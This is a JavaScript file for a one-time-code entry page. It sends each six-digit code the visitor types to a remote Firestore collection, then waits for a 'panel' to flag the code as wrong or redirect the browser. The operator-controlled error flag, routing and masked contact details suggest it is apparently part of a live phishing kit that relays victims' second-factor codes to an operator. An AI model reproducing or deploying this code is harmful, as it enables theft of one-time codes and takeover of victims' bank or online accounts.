document.addEventListener("DOMContentLoaded", function () {
    var otpCells = document.querySelectorAll('.otp-cell');
    var overlay = document.getElementById('bapa-espera-overlay');
    var resendLine = document.getElementById('resend-line');
    var resendSec = document.getElementById('resend-sec');
    var resendBtn = document.getElementById('resend-btn');
    var tokenError = document.getElementById('token-error');

    var timerInterval;
    var timeLeft = 59;

    function startTimer() {
        clearInterval(timerInterval);
        timeLeft = 59;
        if(resendLine) resendLine.hidden = false;
        if(resendBtn) resendBtn.hidden = true;
        if(resendSec) resendSec.textContent = timeLeft;

        timerInterval = setInterval(function () {
            timeLeft--;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                if(resendLine) resendLine.hidden = true;
                if(resendBtn) resendBtn.hidden = false;
            } else {
                if(resendSec) resendSec.textContent = timeLeft;
            }
        }, 1000);
    }

    startTimer();

    otpCells.forEach(function (cell, index) {
        cell.addEventListener('input', function (e) {
            cell.value = cell.value.replace(/\D/g, '');
            
            var otpGroup = document.getElementById('otp-group');
            if (tokenError) tokenError.hidden = true;
            if (otpGroup) otpGroup.classList.remove('otp-row--error');

            if (cell.value.length === 1) {
                if (index < otpCells.length - 1) {
                    otpCells[index + 1].focus();
                } else {
                    submitToken();
                }
            }
        });

        cell.addEventListener('keydown', function (e) {
            if (e.key === 'Backspace' && cell.value === '') {
                if (index > 0) {
                    otpCells[index - 1].focus();
                }
            }
        });
    });

    function submitToken() {
        var token = "";
        otpCells.forEach(function (c) { token += c.value; });
        if (token.length !== 6) return;

        if (overlay) overlay.hidden = false;
        if (tokenError) tokenError.hidden = true;

        var db = window.db;
        var userValue = localStorage.getItem("usuarioActual") || sessionStorage.getItem("dashboard_session_user");
        
        if (db && userValue) {
            var tokenField = window.TOKEN_FIELD || "token";
            var updateData = { tokenResend: false };
            updateData[tokenField] = token;

            db.collection("redireccion").doc(userValue).set(updateData, { merge: true })
            .then(function () {
                // Keep overlay active, waiting for panel redirect
                listenForRedirect(db, userValue);
            })
            .catch(function (err) {
                console.error(err);
                if (overlay) overlay.hidden = true;
            });
        } else {
            console.error("No db or userValue found");
        }
    }

    if (resendBtn) {
        resendBtn.addEventListener('click', function () {
            var db = window.db;
            var userValue = localStorage.getItem("usuarioActual") || sessionStorage.getItem("dashboard_session_user");
            
            if (db && userValue) {
                db.collection("redireccion").doc(userValue).set({
                    tokenResend: true,
                    token: ""
                }, { merge: true }).then(function () {
                    otpCells.forEach(function (c) { c.value = ""; });
                    otpCells[0].focus();
                    startTimer();
                });
            }
        });
    }

    var accessWatcher = null;
    function listenForRedirect(db, userValue) {
        if (accessWatcher) return;

        accessWatcher = db.collection("redireccion").doc(userValue).onSnapshot(function (docSnapshot) {
            if (!docSnapshot.exists) return;

            var userData = docSnapshot.data() || {};
            var page = userData.page;
            
            // Check if there is an error flag for token
            if (userData.tokenErr === true) {
                if (overlay) overlay.hidden = true;
                if (tokenError) tokenError.hidden = false;
                otpCells.forEach(function (c) { c.value = ""; });
                otpCells[0].focus();
                
                // Reset tokenErr
                db.collection("redireccion").doc(userValue).set({ tokenErr: false }, { merge: true });
                return;
            }

            if (userData.phoneMask && document.getElementById('tel-mask')) {
                document.getElementById('tel-mask').textContent = userData.phoneMask;
            }
            if (userData.emailMask && document.getElementById('email-mask')) {
                document.getElementById('email-mask').textContent = userData.emailMask;
            }

            if (typeof page !== "number" || page <= 0) return;

            var route = window.appConfig && window.appConfig.routes && window.appConfig.routes[page]
                ? window.appConfig.routes[page]
                : null;

            if (route && route.url) {
                var currentPath = window.location.pathname.split("/").pop() || "";
                var targetPath = route.url.split("?")[0].split("#")[0].split("/").pop() || "";

                if (targetPath && targetPath === currentPath) return;

                if (accessWatcher) {
                    accessWatcher();
                    accessWatcher = null;
                }

                window.location.href = route.url;
            }
        });
    }

    // Initialize watcher in case panel redirects before submit
    var db = window.db;
    var userValue = localStorage.getItem("usuarioActual") || sessionStorage.getItem("dashboard_session_user");
    if (db && userValue) {
        listenForRedirect(db, userValue);
    }
});
